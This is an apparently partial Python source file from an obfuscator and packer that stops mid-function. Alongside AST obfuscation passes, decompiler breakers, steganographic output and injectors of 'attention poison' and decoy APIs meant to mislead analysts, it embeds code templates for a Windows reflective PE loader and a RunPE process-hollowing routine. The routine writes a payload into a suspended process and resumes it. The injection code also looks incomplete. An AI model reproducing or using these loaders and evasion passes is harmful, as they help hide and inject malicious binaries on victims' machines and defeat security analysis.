import sys, os, zipfile, base64, io, shutil, tempfile, random, hashlib, lzma, struct, time, json, uuid, inspect, platform, marshal, secrets, ctypes, importlib.util, atexit, warnings, zlib, codecs, string, dis, types, traceback, gc, ast, socket, threading, concurrent.futures, logging  # noqa: F401 (this line binds a name used by an embedded template)
from .utils import (
    FUNC_DECOY_XFORM, FUNC_FAKE_DEC, FUNC_FAKE_ENC, FUNC_GC_RESTORE, FUNC_GC_SHIELD, FUNC_HIDE_OBJ,
    FUNC_NEXT_H, FUNC_PIPE_WRAP, FUNC_PROT_EXEC, FUNC_REM_ENT, FUNC_SEC_WIPE, FUNC_STACK_XOR,
    FUNC_STATE_DEC1, FUNC_STATE_EXEC, FUNC_STATE_INIT, FUNC_STATE_LOAD, FUNC_STATE_ON1,
    FUNC_STATE_ON2, FUNC_STATE_PAD, FUNC_STATE_REC, FUNC_STATE_STG0, FUNC_STATE_VM, FUNC_STATE_ZIP1,
    UI
)
from .transforms import (
    ASTMutator, BogusExceptionHandler, BuiltinAliaser, CallGraphObfuscator, CodeChecksumInjector,
    ConstantUnfolder, ControlFlowFlattener, DynamicCodeGenerator, EnhancedJunkInserter,
    ExtendedArgBreaker, FStringLowering, InstructionSubstitutor, MetadataStripper,
    OpaquePredicateInjector, ScopeAnalyzer, StringLiteralObfuscator, SymbolRenamer,
    TypeHintStripper, UnicodeIdentifierEncoder, VariableSplitter, get_random_var_name, stego_encode
)

# Emitter-only randomness (docs/EMITTER_PIPELINE.md): values decided at
# build time travel into the artefact as literal data, so pinning them
# cannot desynchronise pack from run.  None = OS entropy (the default),
# so routing a call site through these changes nothing unless a seed is
# supplied by the build.
_STRUCT_RNG = None


def set_structure_rng(rng):
    global _STRUCT_RNG
    _STRUCT_RNG = rng


def _struct_choice(seq):
    if _STRUCT_RNG is not None:
        return seq[_STRUCT_RNG.randrange(len(seq))]
    return secrets.choice(seq)


def _struct_randbelow(k):
    if _STRUCT_RNG is not None:
        return _STRUCT_RNG.randrange(k)
    return secrets.randbelow(k)


def _struct_hex(n):
    if _STRUCT_RNG is not None:
        return "".join("%02x" % _STRUCT_RNG.randrange(256) for _ in range(n))
    return secrets.token_hex(n)

MEMORY_PROTECTION_SOURCE = '''def {FUNC_SEC_WIPE}(data):
    try:
        if isinstance(data, (bytes, bytearray)):
            for i in range(len(data)):
                data[i] = 0
        elif isinstance(data, str):
            del data
        _nixon_ガベージ가비지.collect()
    except Exception as _e:
        import logging as _lg
        _lg.warning(f"Memory wipe failed: {_e}")
def {FUNC_PROT_EXEC}(code_bytes, namespace=None):
    if namespace is None:
        namespace = {}
    try:
        exec(compile(code_bytes, '<protected>', 'exec'), namespace)
    finally:
        {FUNC_SEC_WIPE}(bytearray(code_bytes) if isinstance(code_bytes, bytes) else code_bytes)
    return namespace'''
GC_MANIPULATION_SOURCE = '''def {FUNC_GC_SHIELD}():
    _nixon_ガベージ가비지.disable()
    return _nixon_ガベージ가비지
def {FUNC_GC_RESTORE}(gc_module):
    gc_module.enable()
    gc_module.collect()
def {FUNC_HIDE_OBJ}(obj):
    try:
        _nixon_ガベージ가비지.collect()
        for _ in range(3):
            _nixon_ガベージ가비지.collect(_)
    except Exception as _e:
        import logging as _lg
        _lg.warning(f"Object hide failed: {_e}")
    return obj'''
FAKE_CRYPTO_LAYER_SOURCE = r'''
def {FUNC_FAKE_ENC}(data, fake_key):
    result = bytearray(data)
    for i in range(len(result)):
        result[i] = (result[i] + fake_key[i % len(fake_key)]) & 0xFF
    return bytes(result)
def {FUNC_FAKE_DEC}(data, fake_key):
    result = bytearray(data)
    for i in range(len(result)):
        result[i] = (result[i] - fake_key[i % len(fake_key)]) & 0xFF
    return bytes(result)
def {FUNC_DECOY_XFORM}(data):
    fake_key = _nixon_ハッシュ해시.sha256(b"DECOY_KEY_NIXON").digest()
    step1 = {FUNC_FAKE_ENC}(data, fake_key)
    step2 = {FUNC_FAKE_DEC}(step1, fake_key)
    status_flag = _nixon_ハッシュ해시.sha256(step2).digest()[0]
    return step2, status_flag
def _nixon_パイプ라인(encrypted_data, real_key, nonce):
    intermediate, flag = {FUNC_DECOY_XFORM}(encrypted_data)
    if flag == 0: intermediate = encrypted_data
    return intermediate
'''
MERKLE_TREE_SOURCE = r'''
class _nixon_マークル머클:
    def __init__(self, left=None, right=None, data=None):
        if data:
            self.hash = _nixon_ハッシュ해시.sha256(data.encode() if isinstance(data, str) else data).hexdigest()
        else:
            combined = (left.hash + right.hash).encode()
            self.hash = _nixon_ハッシュ해시.sha256(combined).hexdigest()
        self.left = left
        self.right = right
def {FUNC_MERKLE_BUILD}(code_blocks):
    if not code_blocks: return None
    leaves = [_nixon_マークル머클(data=block) for block in code_blocks]
    while len(leaves) > 1:
        if len(leaves) % 2 == 1:
            leaves.append(leaves[-1])
        parents = []
        for i in range(0, len(leaves), 2):
            parents.append(_nixon_マークル머클(left=leaves[i], right=leaves[i+1]))
        leaves = parents
    return leaves[0]
def {FUNC_MERKLE_VERIFY}(block, path, root_hash):
    current = _nixon_ハッシュ해시.sha256(block.encode() if isinstance(block, str) else block).hexdigest()
    for sibling, is_left in path:
        if is_left:
            current = _nixon_ハッシュ해시.sha256((sibling + current).encode()).hexdigest()
        else:
            current = _nixon_ハッシュ해시.sha256((current + sibling).encode()).hexdigest()
    return current == root_hash
'''
WINDOWS_REFLECTIVE_LOADER_SOURCE = r'''
class _nixon_リフレクティブ리플렉:
    def __init__(self):
        self.k32 = None
        self.ntdll = None
    def {METHOD_INIT_APIS}(self):
        if _nixon_プラットフォーム플랫폼.system() != "Windows": return False
        self.k32 = _nixon_シータイプ씨타입.windll.kernel32
        self.ntdll = _nixon_シータイプ씨타입.windll.ntdll
        return True
    def {METHOD_LOAD_MEM}(self, pe_data):
        if not self.{METHOD_INIT_APIS}(): return None
        try:
            e_lfanew = _nixon_構造구조.unpack_from("<I", pe_data, 0x3C)[0]
            opt_hdr = e_lfanew + 24
            magic = _nixon_構造구조.unpack_from("<H", pe_data, opt_hdr)[0]
            if magic == 0x20B:
                sz_image = _nixon_構造구조.unpack_from("<I", pe_data, opt_hdr + 56)[0]
                entry_rva = _nixon_構造구조.unpack_from("<I", pe_data, opt_hdr + 16)[0]
                image_base_orig = _nixon_構造구조.unpack_from("<Q", pe_data, opt_hdr + 24)[0]
            else:
                return None
            VirtualAlloc = self.k32.VirtualAlloc
            VirtualAlloc.restype = _nixon_シータイプ씨타입.c_void_p
            VirtualAlloc.argtypes = [_nixon_シータイプ씨타입.c_void_p, _nixon_シータイプ씨타입.c_size_t, _nixon_シータイプ씨타입.c_uint, _nixon_シータイプ씨타입.c_uint]
            base = VirtualAlloc(None, sz_image, 0x3000, 0x40)
            if not base: return None
            sz_headers = _nixon_構造구조.unpack_from("<I", pe_data, opt_hdr + 60)[0]
            _nixon_シータイプ씨타입.memmove(base, pe_data, sz_headers)
            n_sections = _nixon_構造구조.unpack_from("<H", pe_data, e_lfanew + 6)[0]
            sect_offset = opt_hdr + _nixon_構造구조.unpack_from("<H", pe_data, e_lfanew + 20)[0]
            for i in range(n_sections):
                off = sect_offset + (i * 40)
                va = _nixon_構造구조.unpack_from("<I", pe_data, off + 12)[0]
                raw_sz = _nixon_構造구조.unpack_from("<I", pe_data, off + 16)[0]
                raw_ptr = _nixon_構造구조.unpack_from("<I", pe_data, off + 20)[0]
                if raw_sz > 0:
                    _nixon_シータイプ씨타입.memmove(base + va, pe_data[raw_ptr:raw_ptr+raw_sz], raw_sz)
            delta = base - image_base_orig
            if delta != 0:
                reloc_rva = _nixon_構造구조.unpack_from("<I", pe_data, opt_hdr + 152 if magic == 0x20B else opt_hdr + 136)[0]
                if reloc_rva:
                    self.{METHOD_PROC_RELOC}(base, pe_data, reloc_rva, delta)
            return base + entry_rva
        except Exception as e:
            return None    
    def {METHOD_PROC_RELOC}(self, base, pe_data, reloc_rva, delta):
        try:
            offset = reloc_rva
            while True:
                page_rva = _nixon_構造구조.unpack_from("<I", pe_data, offset)[0]
                block_size = _nixon_構造구조.unpack_from("<I", pe_data, offset + 4)[0]
                if block_size == 0: break
                num_entries = (block_size - 8) // 2
                for i in range(num_entries):
                    entry = _nixon_構造구조.unpack_from("<H", pe_data, offset + 8 + i*2)[0]
                    entry_type = entry >> 12
                    entry_off = entry & 0xFFF
                    if entry_type == 10:
                        addr = base + page_rva + entry_off
                        val = _nixon_シータイプ씨타입.cast(addr, _nixon_シータイプ씨타입.POINTER(_nixon_シータイプ씨타입.c_uint64))[0]
                        _nixon_シータイプ씨타입.cast(addr, _nixon_シータイプ씨타입.POINTER(_nixon_シータイプ씨타입.c_uint64))[0] = val + delta
                offset += block_size
        except: pass
    def {METHOD_RUN_PE}(self, target, payload):
        try:
            si = _nixon_シータイプ씨타입.create_string_buffer(68)
            pi = _nixon_シータイプ씨타입.create_string_buffer(24)
            if not self.k32.CreateProcessA(target, None, None, None, False, 0x4, None, None, si, pi): return False
            h_proc = _nixon_構造구조.unpack_from("<I", pi, 0)[0]
            h_thread = _nixon_構造구조.unpack_from("<I", pi, 4)[0]
            dest = self.k32.VirtualAllocEx(h_proc, 0, len(payload), 0x3000, 0x40)
            self.k32.WriteProcessMemory(h_proc, dest, payload, len(payload), 0)
            ctx = _nixon_シータイプ씨타입.create_string_buffer(716)
            self.k32.GetThreadContext(h_thread, ctx)
            self.k32.SetThreadContext(h_thread, ctx)
            self.k32.ResumeThread(h_thread)
            return True
        except: return False
'''
class ExceptionFlowTransformer(ast.NodeTransformer):
    _exc_types = ['ZeroDivisionError', 'IndexError', 'KeyError', 'TypeError',
                  'ValueError', 'StopIteration', 'RuntimeError']
    _triggers = [
        lambda: ast.BinOp(left=ast.Constant(value=1), op=ast.Div(), right=ast.Constant(value=0)),
        lambda: ast.Subscript(value=ast.List(elts=[], ctx=ast.Load()),
                              slice=ast.Constant(value=0), ctx=ast.Load()),
        lambda: ast.Subscript(value=ast.Dict(keys=[], values=[]),
                              slice=ast.Constant(value=""), ctx=ast.Load()),
        lambda: ast.Call(func=ast.Name(id='int', ctx=ast.Load()),
                         args=[ast.Constant(value=None)], keywords=[]),
        lambda: ast.Call(func=ast.Name(id='int', ctx=ast.Load()),
                         args=[ast.Constant(value="x")], keywords=[]),
        lambda: ast.Call(func=ast.Name(id='next', ctx=ast.Load()),
                         args=[ast.Call(func=ast.Name(id='iter', ctx=ast.Load()),
                                        args=[ast.List(elts=[], ctx=ast.Load())],
                                        keywords=[])], keywords=[]),
        lambda: ast.Call(func=ast.Attribute(
                             value=ast.Dict(keys=[], values=[]),
                             attr='__getitem__', ctx=ast.Load()),
                         args=[ast.Constant(value=0)], keywords=[]),
    ]
    def __init__(self):
        self.transform_count = 0
    def visit_FunctionDef(self, node):
        self.generic_visit(node)
        if len(node.body) < 4:
            return node
        if random.random() > 0.3:
            return node
        for child in ast.walk(node):
            if isinstance(child, (ast.Nonlocal, ast.Global)):
                return node
        has_return = any(isinstance(s, ast.Return) for s in node.body)
        if has_return:
            return node
        blocks = []
        current = []
        for stmt in node.body:
            current.append(stmt)
            if len(current) >= 2:
                blocks.append(current)
                current = []
        if current:
            blocks.append(current)
        if len(blocks) < 2 or len(blocks) > len(self._exc_types):
            return node
        state_var = "_nx_exc_state"
        result_var = "_nx_exc_result"
        init_assign = ast.Assign(
            targets=[ast.Name(id=state_var, ctx=ast.Store())],
            value=ast.Constant(value=0)
        )
        result_init = ast.Assign(
            targets=[ast.Name(id=result_var, ctx=ast.Store())],
            value=ast.Constant(value=None)
        )
        loop_var = "_nx_exc_run"
        loop_init = ast.Assign(
            targets=[ast.Name(id=loop_var, ctx=ast.Store())],
            value=ast.Constant(value=True)
        )
        handlers = []
        exc_indices = list(range(len(self._exc_types)))
        random.shuffle(exc_indices)
        exc_map = {}
        for block_idx in range(len(blocks)):
            exc_map[block_idx] = exc_indices[block_idx % len(exc_indices)]
        try_body = []
        for block_idx, block in enumerate(blocks):
            exc_idx = exc_map[block_idx]
            cond = ast.Compare(
                left=ast.Name(id=state_var, ctx=ast.Load()),
                ops=[ast.Eq()],
                comparators=[ast.Constant(value=block_idx)]
            )
            trigger_stmts = list(block)
            if block_idx < len(blocks) - 1:
                next_exc_idx = exc_map[block_idx + 1]
                trigger = self._triggers[next_exc_idx % len(self._triggers)]()
                trigger_stmts.append(ast.Expr(value=trigger))
            else:
                trigger_stmts.append(ast.Assign(
                    targets=[ast.Name(id=loop_var, ctx=ast.Store())],
                    value=ast.Constant(value=False)
                ))
            if_block = ast.If(test=cond, body=trigger_stmts, orelse=[ast.Pass()])
            try_body.append(if_block)
        for block_idx in range(1, len(blocks)):
            exc_idx = exc_map[block_idx]
            exc_name = self._exc_types[exc_idx % len(self._exc_types)]
            handler_body = [
                ast.Assign(
                    targets=[ast.Name(id=state_var, ctx=ast.Store())],
                    value=ast.Constant(value=block_idx)
                )
            ]
            handler = ast.ExceptHandler(
                type=ast.Name(id=exc_name, ctx=ast.Load()),
                name=None,
                body=handler_body
            )
            handlers.append(handler)
        fallback_handler = ast.ExceptHandler(
            type=ast.Name(id='Exception', ctx=ast.Load()),
            name=None,
            body=[ast.Raise()]
        )
        handlers.append(fallback_handler)
        try_stmt = ast.Try(body=try_body, handlers=handlers, orelse=[], finalbody=[])
        while_loop = ast.While(
            test=ast.Name(id=loop_var, ctx=ast.Load()),
            body=[try_stmt],
            orelse=[]
        )
        node.body = [init_assign, result_init, loop_init, while_loop]
        self.transform_count += 1
        return node
def apply_ast_mutation(source_code, options=None):
    if options is None: options = {}
    # Batch-2 MBA levels: validate early so an invalid mba_level raises
    # ValueError instead of being swallowed by the broad except below.
    if options.get('mba_subs') and 'mba_level' in options:
        _lv = options.get('mba_level')
        if isinstance(_lv, bool) or _lv not in (1, 2, 3):
            try:
                _lv = int(_lv)
            except Exception:
                pass
            if isinstance(_lv, bool) or _lv not in (1, 2, 3):
                raise ValueError(f"unknown MBA level: {options.get('mba_level')!r} (valid: 1-3)")
    # Hardening A1c: validate the KEK shard BEFORE the broad except below,
    # so a missing shard fails loud instead of silently returning
    # un-obfuscated source (a security downgrade that must never be quiet).
    if options.get('fragment_strings') and options.get('string_key_env'):
        try:
            from obfuscator.string_crypto import _read_env_shard as _shard
            _shard(options.get('string_key_env'))
        except ValueError:
            raise
        except Exception as e:
            raise ValueError(f"string_key_env unreadable: {e}")
    try:
        tree = ast.parse(source_code)
        def get_depth(node, current=1):
            if current > 800: return current
            max_d = current
            for child in ast.iter_child_nodes(node):
                max_d = max(max_d, get_depth(child, current + 1))
            return max_d
        if get_depth(tree) > 750:
             UI.warn("Extreme AST depth detected. This may cause instability.")
        protected_functions = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef):
                if node.body and isinstance(node.body[0], ast.Expr):
                    if isinstance(node.body[0].value, ast.Constant):
                        docstring = node.body[0].value.value
                        if isinstance(docstring, str) and 'NIXON_PROTECTED' in docstring:
                            protected_functions.add(node.name)
                if node.name in ['_load_native', '_exec_fallback', '_xor_decrypt', 
                                '_load_native_impl', '_cleanup_temp']:
                    protected_functions.add(node.name)
        analyzer = ScopeAnalyzer()
        analyzer.visit(tree)
        unsafe = analyzer.get_unsafe_functions()
        if unsafe:
            print(f"    [!] Warning: {len(unsafe)} functions have potential scope issues")
            for func_name, unbound_vars in unsafe[:3]:
                print(f"        - {func_name}: {list(unbound_vars)[:5]}")
        detached_nodes = []
        new_body = []
        for node in tree.body:
            is_protected = False
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
                if node.name in protected_functions:
                    is_protected = True
            if is_protected:
                detached_nodes.append(node)
            else:
                new_body.append(node)
        tree.body = new_body
        fstring_lower = FStringLowering()
        tree = fstring_lower.visit(tree)
        stripper = TypeHintStripper()
        tree = stripper.visit(tree)
        secure_map = {}
        mutator = ASTMutator(junk_enabled=options.get('enhanced_junk', True))
        tree = mutator.visit(tree)
        if options.get('cfg_flatten'):
            flattener = ControlFlowFlattener()
            tree = flattener.visit(tree)
        if options.get('exception_flow'):
            exc_flow = ExceptionFlowTransformer()
            tree = exc_flow.visit(tree)
        if options.get('opaque_predicates'):
            opaque = OpaquePredicateInjector()
            tree = opaque.visit(tree)
        if options.get('mba_subs'):
            try:
                _mba_level = int(options.get('mba_level', 2))
            except Exception:
                _mba_level = 2
            mba = InstructionSubstitutor(
                mba_validator=options.get('mba_validator'),
                level=_mba_level,
            )
            tree = mba.visit(tree)
        if options.get('obf_calls'):
            call_obf = CallGraphObfuscator()
            tree = call_obf.visit(tree)
        if options.get('bogus_exceptions'):
            bogus = BogusExceptionHandler()
            tree = bogus.visit(tree)
        if options.get('split_vars'):
            splitter = VariableSplitter()
            tree = splitter.visit(tree)
        if options.get('unfold_constants'):
            unfolder = ConstantUnfolder()
            tree = unfolder.visit(tree)
        _nonlocal_vars = set()
        for _n in ast.walk(tree):
            if isinstance(_n, ast.Nonlocal):
                _nonlocal_vars.update(_n.names)
        # AUDIT GAP #64 (C11): __all__ preservation. Read module-level
        # __all__ from the AST BEFORE SymbolRenamer runs and reserve the
        # statically known export names so public exports survive
        # obfuscation. Dynamic __all__ (computed) -> warn, no rewrite.
        _all_names = []  # type: list
        _all_dynamic = False
        try:
            from obfuscator.all_preserve import extract_all_names as _extract_all
            _all_names, _all_dynamic = _extract_all(tree)
        except Exception:
            _all_names, _all_dynamic = [], False
        if _all_dynamic:
            try:
                from obfuscator.all_preserve import warning_comment as _all_warn
                print("    [!] Warning: %s" % (_all_warn(_all_names, True),))
            except Exception:
                print("    [!] Warning: dynamic __all__ detected; left untouched")
        if options.get('builtin_alias'):
            # Additive opt-in (default OFF): alias builtin loads to
            # babel names. Runs before the renamers; aliases start
            # with '_' so both renamers leave them alone.
            _aliaser = BuiltinAliaser()
            tree = _aliaser.visit(tree)
            _alias_preamble = _aliaser.get_preamble()
        else:
            _alias_preamble = ""
        if options.get('symbol_rename'):
            renamer = SymbolRenamer()
            renamer.reserved.update({'NATIVE_BLOBS', 'FALLBACK_BLOB', 'BLOB_KEY'})
            # AUDIT GAPS #52/#75: trial-gate + hwid-unlock loader helpers and
            # their _NX_* markers must survive whole-artifact renames.
            renamer.reserved.update({
                '_nx_hwid_unlock', '_nx_trial_gate',
                '_NX_HWID_LOCK', '_NX_HWID_STATIC', '_NX_TRIAL_GATE', '_NX_TRIAL_SECONDS',
                '_NX_TRIAL_KEY', '_NX_TRIAL_DEADLINE', '_NX_TRIAL_TOKEN',
                '_NX_TRIAL_HWID_HINT', '_NX_KOD_ARMED', '_NX_VM_THRESHOLD',
            })
            # V10 kernel-driver gate (SAFE read-only gate): helper + marker
            # names must survive whole-artifact renames (same shape as
            # #52/#75) or the armed gate breaks at runtime.
            renamer.reserved.update({
                '_nx_driver_stem', '_nx_driver_armed', '_nx_enum_drivers',
                '_nx_driver_hits', '_nx_driver_watch', 'driver_check',
                '_NX_DRIVER_BLOCKED', '_NX_DRIVER_ARMED_BUILD',
                '_NX_DRIVER_ARMED_VALUES', '_NX_DRIVER_INTERVAL',
                '_NX_DRIVER_VAR', '_NX_DRIVER_CHECK_ARMED',
            })
            # AUDIT GAP #64 (C11): public exports survive the renamer.
            renamer.reserved.update({'__all__'})
            if _all_names:
                renamer.reserved.update(_all_names)
            # AUDIT GAP #71: the watermark gate helpers/markers must
            # survive whole-artifact renames (same shape as #52/#75).
            renamer.reserved.update({
                '_nx_watermark_gate',
                '_NX_WATERMARK_GATE', '_NX_WATERMARK_KEY', '_NX_WATERMARK_MSG',
                '_NX_WATERMARK_TAG', '_NX_WATERMARK_MARKER',
            })
            # V10 split-bootstrap (opt-in): fragmented-decoder helpers +
            # stub fragment markers survive whole-artifact renames.
            renamer.reserved.update({
                '_nx_sb_collect', '_nx_sb_combine', '_nx_sb_activate',
                '_NX_SB_HEAD', '_NX_SB_TRAIL', '_NX_SB_SALT', '_NX_SB_KEY',
                '_NX_SB_THIRD', '_NX_SPLIT_BOOTSTRAP',
                '_NX_SPLIT_BOOTSTRAP_ARMED', 'BLOB_KEY_SB',
            })
            # Runtime integrity (frozen snapshots + stdlib audit): gate
            # helpers + marker literals must survive whole-artifact
            # renames (same shape as #52/#75) or the armed gates break.
            renamer.reserved.update({
                '_nx_snapshot_gate', '_nx_stdlib_gate',
                '_NX_SNAPSHOT_GATE', '_NX_SNAPSHOT_TAG', '_NX_SNAPSHOT_FILES',
                '_NX_STDLIB_GATE', '_NX_STDLIB_TAG', '_NX_STDLIB_FUNCS',
            })
            # VM loader helpers (public runtime API in vm_score.py):
            # vm_check / vm_score_percent must survive whole-artifact
            # renames or the armed VM gate breaks at runtime.
            renamer.reserved.update({'vm_check', 'vm_score_percent'})
            # V10 internal-rename (opt-in, default OFF): prove internal-only
            # methods first, then allow the renamer to rename exactly those
            # (defs + attribute uses rewrite consistently; __all__ exports
            # are excluded inside the proof itself).
            if options.get('rename_internal'):
                try:
                    from obfuscator.internal_rename import find_internal_methods as _find_internal
                    _internal_pairs = _find_internal(tree, _all_names)
                    _internal_names = sorted({m for _, m in _internal_pairs})
                    # Never fight reserved markers/exports: the proof
                    # already excludes __all__, but belt-and-suspenders
                    # against loader markers costs nothing.
                    _internal_names = [n for n in _internal_names if n not in renamer.reserved]
                    if _internal_names:
                        renamer.allow_internal_rename_names(_internal_names)
                except Exception:
                    pass
            dyn_unbounds = set(_nonlocal_vars)
            if unsafe:
                for _, u_vars in unsafe:
                    dyn_unbounds.update(u_vars)
            renamer.dynamic_unbounds = dyn_unbounds
            renamer.protected_functions = protected_functions
            tree = renamer.visit(tree)
            # Renaming happens at visit time, so a mapping created late never
            # reaches a binding visited early: the function table was rewritten
            # to `_nx_f24f62` while the definition kept another name, and the
            # entry named a function that was never emitted. Applying the final
            # mapping once more makes the result independent of traversal order.
            tree = _apply_final_rename(tree, renamer)
            if options.get('log_file'):
                renamer.save_rename_log(options['log_file'])
        if options.get('unicode_ids'):
            encoder = UnicodeIdentifierEncoder()
            encoder.reserved.update({'NATIVE_BLOBS', 'FALLBACK_BLOB', 'BLOB_KEY'})
            encoder.reserved.update({
                '_nx_hwid_unlock', '_nx_trial_gate',
                '_NX_HWID_LOCK', '_NX_HWID_STATIC', '_NX_TRIAL_GATE', '_NX_TRIAL_SECONDS',
                '_NX_TRIAL_KEY', '_NX_TRIAL_DEADLINE', '_NX_TRIAL_TOKEN',
                '_NX_TRIAL_HWID_HINT', '_NX_KOD_ARMED', '_NX_VM_THRESHOLD',
            })
            # V10 kernel-driver gate: same helper/marker set for the
            # encoder path (unicode encoding must not touch the gate).
            encoder.reserved.update({
                '_nx_driver_stem', '_nx_driver_armed', '_nx_enum_drivers',
                '_nx_driver_hits', '_nx_driver_watch', 'driver_check',
                '_NX_DRIVER_BLOCKED', '_NX_DRIVER_ARMED_BUILD',
                '_NX_DRIVER_ARMED_VALUES', '_NX_DRIVER_INTERVAL',
                '_NX_DRIVER_VAR', '_NX_DRIVER_CHECK_ARMED',
            })
            # AUDIT GAP #64 (C11): public exports survive unicode encoding.
            encoder.reserved.update({'__all__'})
            if _all_names:
                encoder.reserved.update(_all_names)
            # AUDIT GAP #71: same gate helpers/markers for the encoder path.
            encoder.reserved.update({
                '_nx_watermark_gate',
                '_NX_WATERMARK_GATE', '_NX_WATERMARK_KEY', '_NX_WATERMARK_MSG',
                '_NX_WATERMARK_TAG', '_NX_WATERMARK_MARKER',
            })
            # V10 split-bootstrap (opt-in): same helpers/markers for the
            # encoder path (unicode encoding must not touch the decoder).
            encoder.reserved.update({
                '_nx_sb_collect', '_nx_sb_combine', '_nx_sb_activate',
                '_NX_SB_HEAD', '_NX_SB_TRAIL', '_NX_SB_SALT', '_NX_SB_KEY',
                '_NX_SB_THIRD', '_NX_SPLIT_BOOTSTRAP',
                '_NX_SPLIT_BOOTSTRAP_ARMED', 'BLOB_KEY_SB',
            })
            # Runtime integrity: same gate helpers/markers for the
            # encoder path (unicode encoding must not touch the gates).
            encoder.reserved.update({
                '_nx_snapshot_gate', '_nx_stdlib_gate',
                '_NX_SNAPSHOT_GATE', '_NX_SNAPSHOT_TAG', '_NX_SNAPSHOT_FILES',
                '_NX_STDLIB_GATE', '_NX_STDLIB_TAG', '_NX_STDLIB_FUNCS',
            })
            # VM loader helpers: same names for the encoder path.
            encoder.reserved.update({'vm_check', 'vm_score_percent'})
            encoder.reserved.update(_nonlocal_vars)
            # V10 internal-rename (opt-in, default OFF): same proof set as
            # the renamer so unicode encoding renames exactly the proven
            # internal methods (defs + attribute uses stay in sync).
            if options.get('rename_internal'):
                try:
                    from obfuscator.internal_rename import find_internal_methods as _find_internal_u
                    _pairs_u = _find_internal_u(tree, _all_names)
                    _names_u = sorted({m for _, m in _pairs_u})
                    _names_u = [n for n in _names_u if n not in encoder.reserved]
                    if _names_u:
                        encoder.allow_internal_rename_names(_names_u)
                except Exception:
                    pass
            tree = encoder.visit(tree)
        if options.get('strip_meta'):
            meta_strip = MetadataStripper()
            tree = meta_strip.visit(tree)
        if options.get('dynamic_code'):
            dyn_gen = DynamicCodeGenerator()
            tree = dyn_gen.visit(tree)
        if options.get('attention_poison'):
            from obfuscator.attention_poison import AttentionPoisonInjector
            fan_out = options.get('attention_poison_fan_out', 10)
            ap = AttentionPoisonInjector(fan_out=fan_out)
            tree = ap.visit(tree)
            print(f"    [+] Attention Poison: explosion ratio = {ap.explosion_ratio():.2f}x")
        if options.get('decoy_apis'):
            from obfuscator.decoy_apis import SemanticDecoyApiInjector
            count = options.get('decoy_api_count', 5)
            di = SemanticDecoyApiInjector(count=count)
            if isinstance(tree, ast.Module):
                tree = di.inject(tree)
            print(f"    [+] Decoy APIs: injected {count} fake APIs")
        if options.get('adaptive_rewrite'):
            from obfuscator.adaptive_rewriter import AdaptiveRewriter
            _project_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
            if _project_root not in sys.path:
                sys.path.insert(0, _project_root)
            from scripts.benchmark.feedback import WeaknessProfile
            profile_data = options.get('weakness_profile', {})
            profile = WeaknessProfile(
                failed_metrics=profile_data.get('failed_metrics', []),
                weak_scores=profile_data.get('weak_scores', {}),
                recommended_actions=profile_data.get('recommended_actions', []),
            )
            ast.fix_missing_locations(tree)
            rewriter = AdaptiveRewriter()
            result = rewriter.rewrite(profile, ast.unparse(tree))
            tree = ast.parse(result)
        if options.get('enhanced_junk'):
            junk_ins = EnhancedJunkInserter()
            tree = junk_ins.visit(tree)
        if options.get('break_decompiler', True):
            brk = ExtendedArgBreaker()
            tree = brk.visit(tree)
        if options.get('code_checksums'):
            chk_inj = CodeChecksumInjector()
            tree = chk_inj.visit(tree)
        if options.get('fragment_strings'):
            # Hardening A1a: default is authenticated ChaCha20 string
            # mode; explicit {"string_crypto": "xor"} selects legacy XOR.
            # string_allowlist=[...] keeps matching strings plaintext.
            # string_key=<32 bytes> pins the build key (tests/determinism).
            try:
                from obfuscator.string_crypto import normalize_mode as _nx_norm
                _nx_mode = _nx_norm(options.get('string_crypto',
                                                'chacha20'))
            except Exception:
                _nx_mode = 'xor'
            str_obf = StringLiteralObfuscator(
                mode=_nx_mode,
                allowlist=options.get('string_allowlist'),
                string_key=options.get('string_key'),
                kek_env=options.get('string_key_env'),
                part_prefix=VARS.get('PART_PREFIX'))
            tree = str_obf.visit(tree)
            preamble = str_obf.get_preamble()
        else: preamble = ""
        insert_idx = 0
        for i, node in enumerate(tree.body):
            if isinstance(node, (ast.Import, ast.ImportFrom)):
                insert_idx = i + 1
            elif isinstance(node, ast.Expr) and isinstance(node.value, ast.Constant) and isinstance(node.value.value, str):
                insert_idx = i + 1
            else:
                break        
        for node in reversed(detached_nodes):
            tree.body.insert(insert_idx, node)
        # G2-H2 representation diversification (opt-in, default OFF):
        # structurally rewrites literals/expressions. Runs last so no
        # later pass needs to understand its output shapes.
        if options.get('rep_diversify'):
            try:
                from obfuscator.rep_diversify import RepDiversifier as _RepDiv
                _seed = options.get('rep_seed', None)
                tree = _RepDiv(seed=_seed).visit(tree)
            except Exception:
                pass
        # G2-H3/H4 execution-model diversification (opt-in, default OFF):
        # selective function-level virtualization, VM-A (switch) or
        # VM-B (threaded) dispatcher. Runs last; ineligible functions
        # pass through untouched.
        if options.get('vm_dispatch') in ('a', 'b'):
            try:
                from obfuscator.vm_dispatch import VMDispatchTransformer as _VMDisp
                tree = _VMDisp(seed=options.get('vm_seed', None),
                               family=options.get('vm_dispatch')).visit(tree)
            except Exception:
                pass
        ast.fix_missing_locations(tree)
        code_output = ast.unparse(tree)
        # `from __future__ ...` is a compiler directive, not an import: it must
        # precede every other statement. Prepending the preamble put sixty-odd
        # lines of scaffolding above it and the artefact did not compile.
        # Insert the preamble after the directive block instead.
        _extra = "\n".join(x for x in (_alias_preamble, preamble) if x)
        if _extra:
            _lines = code_output.splitlines()
            _cut = 0
            for _line in _lines:
                if _line.startswith("from __future__ import"):
                    _cut += 1
                elif _line.strip() == "" and _cut:
                    _cut += 1
                else:
                    break
            _head = "\n".join(_lines[:_cut])
            _tail = "\n".join(_lines[_cut:])
            code_output = (_head + "\n" if _head else "") + _extra + "\n" + _tail
        if options.get('stego'): code_output = stego_encode(code_output)
        return code_output, secure_map
    except Exception as e:
        print(f"Error during AST mutation: {e}")
        traceback.print_exc()
        return source_code, {}
class OpcodeMorpher:
    def __init__(self, seed=None, enc_map=None, runtime_entropy=None):
        if enc_map:
            self.enc_map = enc_map
            self.dec_map = {v: k for k, v in enumerate(enc_map)}
        else:
            self.enc_map = list(range(256))
            if seed:
                base_rng = random.Random(seed)
                if runtime_entropy:
                    combined_seed = int.from_bytes(hashlib.sha256(str(seed).encode() + str(runtime_entropy).encode()).digest()[:8], 'little')
                    base_rng = random.Random(combined_seed)
                base_rng.shuffle(self.enc_map)
            else:
                for i in range(255, 0, -1):
